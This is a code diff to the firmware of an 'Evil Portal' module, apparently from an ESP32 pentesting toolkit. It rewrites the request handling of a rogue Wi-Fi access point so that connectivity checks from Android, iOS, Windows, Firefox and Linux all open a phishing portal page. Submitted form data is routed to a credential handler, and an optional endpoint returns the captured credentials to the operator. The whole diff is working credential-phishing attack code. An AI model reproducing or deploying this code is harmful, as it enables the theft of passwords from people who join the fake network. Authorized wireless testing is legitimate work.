@@ -65,58 +65,22 @@ EvilPortal::~EvilPortal() {}
 // CaptiveRequestHandler — handles requests coming through the AP filter
 // ---------------------------------------------------------------------------
 void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
-    String url = request->url();
-    url.toLowerCase();
+    String url  = request->url();
+    String host = request->host();
 
-    bool isProbe = false;
-
-    // Android / Samsung / Chrome / ChromeOS
-    if (url == "/generate_204" || url == "/gen_204" || url == "/generate204" ||
-        url.indexOf("generate_204") != -1 ||
-        url.indexOf("connectivitycheck") != -1 ||
-        url.indexOf("clients3.google") != -1 ||
-        url.indexOf("clients4.google") != -1) {
-        isProbe = true;
-    }
-    // Apple
-    else if (url == "/hotspot-detect.html" ||
-             url == "/library/test/success.html" ||
-             url == "/success.html" ||
-             url.indexOf("hotspot-detect") != -1) {
-        isProbe = true;
-    }
-    // Windows
-    else if (url == "/connecttest.txt" || url == "/ncsi.txt" ||
-             url.indexOf("msftconnecttest") != -1 ||
-             url.indexOf("msftncsi") != -1) {
-        isProbe = true;
-    }
-    // Firefox
-    else if (url == "/canonical.html" || url == "/success.txt" ||
-             url.indexOf("detectportal.firefox") != -1) {
-        isProbe = true;
-    }
-
-    if (isProbe) {
-        _portal->recordPageView();
-        if (_portal->isDefaultHtml)
-            request->send(200, "text/html", _portal->htmlPage);
-        else
-            request->send(*_portal->fsHtmlFile, _portal->htmlFileName, "text/html");
-        return;
-    }
-
-    // Explicit routes
-    if (url == "/" || url == "/index.html") {
-        _portal->portalController(request);
-        return;
-    }
-    if (url == "/post") {
+    // ---- Credential POST — never intercept these ----
+    if (request->method() == HTTP_POST) {
         _portal->credsController(request);
         return;
     }
 
-    // Admin endpoints (optional)
+    // ---- /post GET (form fallback with args) ----
+    if (url == "/post" || (url == "/" && request->args() > 0)) {
+        _portal->credsController(request);
+        return;
+    }
+
+    // ---- Admin endpoints ----
     if (url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
         bruceConfig.evilPortalEndpoints.allowGetCreds) {
         request->send(200, "text/html", _portal->creds_GET());
@@ -134,13 +98,21 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
         return;
     }
 
-    // CATCH-ALL — critical for PCs and unknown paths
-    if (request->args() > 0)
-        _portal->credsController(request);
+    // ---- EVERYTHING ELSE: serve portal page ----
+    // This handles:
+    //   Android/Chrome  → /generate_204, /gen_204  (200 != 204 → popup)
+    //   iOS/macOS       → /hotspot-detect.html with Host: captive.apple.com
+    //   Windows 10/11   → /connecttest.txt with Host: www.msftconnecttest.com
+    //   Windows 8       → /ncsi.txt with Host: www.msftncsi.com
+    //   Firefox         → /canonical.html, /success.txt
+    //   Linux/GNOME     → /generate_204
+    //   Any browser     → any unknown URL → portal
+    _portal->recordPageView();
+    if (_portal->isDefaultHtml)
+        request->send(200, "text/html", _portal->htmlPage);
     else
-        _portal->portalController(request);
+        request->send(*_portal->fsHtmlFile, _portal->htmlFileName, "text/html");
 }
-
 
 // ---------------------------------------------------------------------------
 // setup()
@@ -274,110 +246,27 @@ void EvilPortal::beginAP() {
 //     Fix: redirect to portal
 // ---------------------------------------------------------------------------
 void EvilPortal::setupRoutes() {
-    String apIp = WiFi.softAPIP().toString();
+    // Only explicit routes needed are POST targets since the
+    // CaptiveRequestHandler now catches all GETs via canHandle()=true
 
-    // ---- Android / Chrome / Samsung: MUST return 200 with body, NOT 302 ----
-    // Returning 302 here is the main reason Samsung doesn't show the popup.
-    // A non-204 200 response tells Android/Chrome a captive portal is present.
-    auto serve200Portal = [this](AsyncWebServerRequest *request) {
-        // Record a page view for activity tracking
-        recordPageView();
-        // Serve actual portal page so Android's mini-browser opens it directly
-        if (isDefaultHtml)
-            request->send(200, "text/html", htmlPage);
-        else
-            request->send(*fsHtmlFile, htmlFileName, "text/html");
-    };
-
-    webServer.on("/generate_204",   HTTP_GET, serve200Portal);
-    webServer.on("/gen_204",        HTTP_GET, serve200Portal);
-    webServer.on("/generate204",    HTTP_GET, serve200Portal);
-
-    // Also handle gstatic / connectivitycheck paths (DNS wildcards send them here)
-    webServer.on("/generate_204/",  HTTP_GET, serve200Portal);
-
-    // ---- iOS / macOS: serve portal page directly so CNA opens it ----
-    // Do NOT return "Success" — that tells iOS the internet is open.
-    webServer.on("/hotspot-detect.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        recordPageView();
-        if (isDefaultHtml)
-            request->send(200, "text/html", htmlPage);
-        else
-            request->send(*fsHtmlFile, htmlFileName, "text/html");
+    webServer.on("/post", HTTP_POST, [this](AsyncWebServerRequest *r) {
+        credsController(r);
     });
-    webServer.on("/library/test/success.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        recordPageView();
-        // Return 200 but body must NOT contain "Success" exactly — our portal page is fine
-        if (isDefaultHtml)
-            request->send(200, "text/html", htmlPage);
-        else
-            request->send(*fsHtmlFile, htmlFileName, "text/html");
-    });
-    webServer.on("/success.html",   HTTP_GET, [this](AsyncWebServerRequest *request) {
-        recordPageView();
-        if (isDefaultHtml) request->send(200, "text/html", htmlPage);
-        else request->send(*fsHtmlFile, htmlFileName, "text/html");
+    webServer.on("/", HTTP_POST, [this](AsyncWebServerRequest *r) {
+        credsController(r);
     });
 
-    // ---- Windows NCSI — return something other than the expected text ----
-    // Windows will detect the mismatch and open the default browser to the portal.
-    webServer.on("/connecttest.txt", HTTP_GET, [this, apIp](AsyncWebServerRequest *request) {
-        AsyncWebServerResponse *r = request->beginResponse(302);
-        r->addHeader("Location", "http://" + apIp + "/");
-        request->send(r);
-    });
-    webServer.on("/ncsi.txt", HTTP_GET, [this, apIp](AsyncWebServerRequest *request) {
-        AsyncWebServerResponse *r = request->beginResponse(302);
-        r->addHeader("Location", "http://" + apIp + "/");
-        request->send(r);
-    });
-    webServer.on("/redirect", HTTP_GET, [this, apIp](AsyncWebServerRequest *request) {
-        AsyncWebServerResponse *r = request->beginResponse(302);
-        r->addHeader("Location", "http://" + apIp + "/");
-        request->send(r);
-    });
-
-    // ---- Firefox: serve portal page for canonical/success checks ----
-    webServer.on("/canonical.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        recordPageView();
-        if (isDefaultHtml) request->send(200, "text/html", htmlPage);
-        else request->send(*fsHtmlFile, htmlFileName, "text/html");
-    });
-    webServer.on("/success.txt", HTTP_GET, [this, apIp](AsyncWebServerRequest *request) {
-        // Firefox expects "success" — anything else triggers portal notification
-        AsyncWebServerResponse *r = request->beginResponse(302);
-        r->addHeader("Location", "http://" + apIp + "/");
-        request->send(r);
-    });
-
-    // ---- Windows / misc redirects ----
-    webServer.on("/fwlink", HTTP_GET, [this, apIp](AsyncWebServerRequest *request) {
-        AsyncWebServerResponse *r = request->beginResponse(302);
-        r->addHeader("Location", "http://" + apIp + "/");
-        request->send(r);
-    });
-    webServer.on("/wpad.dat", HTTP_GET, [this, apIp](AsyncWebServerRequest *request) {
-        AsyncWebServerResponse *r = request->beginResponse(302);
-        r->addHeader("Location", "http://" + apIp + "/");
-        request->send(r);
-    });
-
-    // ---- Main routes ----
-    webServer.on("/",     HTTP_GET,  [this](AsyncWebServerRequest *r) { portalController(r); });
-    webServer.on("/",     HTTP_POST, [this](AsyncWebServerRequest *r) { credsController(r);  });
-    webServer.on("/post", HTTP_POST, [this](AsyncWebServerRequest *r) { credsController(r);  });
-    webServer.on("/post", HTTP_GET,  [this](AsyncWebServerRequest *r) { credsController(r);  });
-
-    // ---- Optional admin endpoints ----
     if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
         webServer.on(
             bruceConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
+            HTTP_GET,
             [this](AsyncWebServerRequest *r) { r->send(200, "text/html", creds_GET()); }
         );
     }
     if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
         webServer.on(
             bruceConfig.evilPortalEndpoints.setSsidEndpoint.c_str(),
+            HTTP_ANY,
             [this](AsyncWebServerRequest *request) {
                 if (request->hasArg("ssid")) {
                     apName = request->arg("ssid").c_str();
@@ -390,32 +279,18 @@ void EvilPortal::setupRoutes() {
         );
     }
 
-    // ---- Catch-all: redirect everything else to portal ----
-    webServer.onNotFound([this, apIp](AsyncWebServerRequest *request) {
-        String url = request->url();
-
-        // Connectivity-check paths — redirect to portal (triggers popup on most OS)
-        if (url.indexOf("detectportal") != -1  || url.indexOf("connecttest") != -1  ||
-            url.indexOf("generate") != -1       || url.indexOf("msftconnecttest") != -1 ||
-            url.indexOf("clients3.google") != -1 || url.indexOf("ncsi") != -1 ||
-            url.indexOf("nmcheck") != -1        || url.indexOf("gnome") != -1 ||
-            url.indexOf("ubuntu") != -1         || url.indexOf("canonical") != -1 ||
-            url.indexOf("networkcheck") != -1   || url.indexOf("hotspot") != -1 ||
-            url.indexOf("msftncsi") != -1) {
-            AsyncWebServerResponse *r = request->beginResponse(302);
-            r->addHeader("Location", "http://" + apIp + "/");
-            request->send(r);
-            return;
-        }
-
-        if (request->args() > 0) credsController(request);
-        else portalController(request);
+    // Catch-all for anything not matched above (belt + suspenders)
+    webServer.onNotFound([this](AsyncWebServerRequest *r) {
+        if (r->method() == HTTP_POST) { credsController(r); return; }
+        recordPageView();
+        if (isDefaultHtml) r->send(200, "text/html", htmlPage);
+        else r->send(*fsHtmlFile, htmlFileName, "text/html");
     });
 
+    // The handler that does the real work — catches ALL GETs
     _captiveHandler = new CaptiveRequestHandler(this);
     webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
 }
-
 // ---------------------------------------------------------------------------
 // restartWiFi()
 // ---------------------------------------------------------------------------
